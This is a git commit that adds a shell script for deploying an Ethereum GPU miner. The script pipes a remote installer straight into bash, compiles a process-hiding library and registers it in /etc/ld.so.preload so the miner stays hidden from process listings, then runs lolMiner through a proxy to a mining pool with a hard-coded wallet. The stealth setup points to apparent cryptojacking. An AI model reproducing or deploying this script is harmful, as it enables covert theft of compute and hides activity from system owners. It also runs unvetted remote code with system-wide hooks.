5f7e347f940bed2b104b1f27e67163b8cbff39e9
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-06-15 11:16:27 +0200

    Create start_lol_flexManWs2.sh

---
+++ start_lol_flexManWs2.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks2.sh | bash
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicLol.zip
+unzip magicLol.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.26/lolMiner_v1.26_Lin64.tar.gz
+tar -xvzf lolMiner_v1.26_Lin64.tar.gz
+rm .gitignore
+cd 1.26
+graftcp ./lolMiner -a ETHASH --pool us1.ethermine.org:5555 --tls on --user 0x220945AFC8954BEB54fAcCCe8c55c40ec7Ecbb79 --worker lolMiner --shortstats 30 --timeprint on --log on --ethstratum ETHPROXY --nocolor
